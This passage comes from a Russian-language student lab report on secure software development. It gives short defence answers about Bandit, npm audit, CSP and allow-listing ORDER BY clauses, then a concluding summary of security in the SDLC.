+## 8. Короткие ответы на вопросы по защите
+
+**Что делает Bandit?**  
+Bandit — это SAST-инструмент для Python. Он статически анализирует исходный код и ищет опасные конструкции, например `debug=True`, `shell=True`, hardcoded secrets и строковую сборку SQL.
+
+**Почему Bandit не заменяет тесты?**  
+Потому что он находит паттерны в коде, но не проверяет реальное поведение приложения во время выполнения.
+
+**Что показывает `npm audit`?**  
+`npm audit` показывает известные CVE в зависимостях Node.js-проекта. Это класс SCA.
+
+**Почему CSP важен, если уже есть экранирование?**  
+Потому что CSP — это дополнительный защитный слой. Даже если разработчик где-то ошибся, браузер всё равно ограничит выполнение скриптов.
+
+**Почему в `ORDER BY` нужен allow-list, а не placeholder?**  
+Потому что placeholder подставляет значение как данные, а имя поля или выражение сортировки — это часть SQL-синтаксиса. Для такого случая нужен только allow-list.
+
+**Что именно доказывает secure-версия приложений?**  
+Что исправления не декларативные, а поведенческие: есть тесты и скрипты, которые подтверждают, что атаки либо блокируются, либо перестают быть исполнимыми.
+
+---
+
+## 9. Итоговый вывод
+
+Лабораторная работа №13 показывает безопасную разработку как инженерный процесс, а не как набор разрозненных советов. В первой части безопасность встроена в исходный код и проверяется `Bandit + pytest`. Во второй части она дополняется защитой уровня веб-приложения: безопасные шаблоны, CSP, санитизация, проверка зависимостей и внешнее тестирование.
+
+Ключевая мысль для защиты такая:
+
+> Безопасность в SDLC — это комбинация архитектурных решений, secure coding-практик и автоматизированных проверок на каждом этапе разработки.
